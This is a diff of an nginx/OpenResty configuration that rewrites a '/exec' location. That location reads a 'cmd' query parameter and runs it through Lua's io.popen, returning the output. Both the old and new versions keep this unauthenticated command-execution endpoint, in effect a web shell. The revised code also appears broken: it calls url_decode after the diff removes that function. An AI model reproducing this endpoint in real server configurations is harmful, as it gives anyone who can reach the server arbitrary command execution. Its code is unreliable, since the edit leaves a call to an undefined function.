@@ -31,23 +31,18 @@ http {
     }
 
     location /exec { 
-        content_by_lua '
+      set_unescape_uri $cmd $arg_cmd;
 
-            function url_decode(str)
-              str = string.gsub (str, "+", " ")
-              str = string.gsub (str, "%%(%x%x)", function(h) return string.char(tonumber(h,16)) end)
-              str = string.gsub (str, "\r\n", "\n")
-              return str
-            end
+      content_by_lua '
+          local cmd = url_decode(ngx.var["cmd"])
+          ngx.print("command: ", cmd, "\\n")
 
-            local cmd = url_decode(ngx.var["arg_cmd"])
-            ngx.print("command: ", cmd, "\\n")
-            local handle = io.popen(cmd)
-            local result = handle:read("*a")
-            ngx.say("result:")
-            ngx.say(result)
-            handle:close()
-        ';
+          local handle = io.popen(cmd)
+          local result = handle:read("*a")
+          ngx.say("result:")
+          ngx.say(result)
+          handle:close()
+      ';
     } 
 
   }
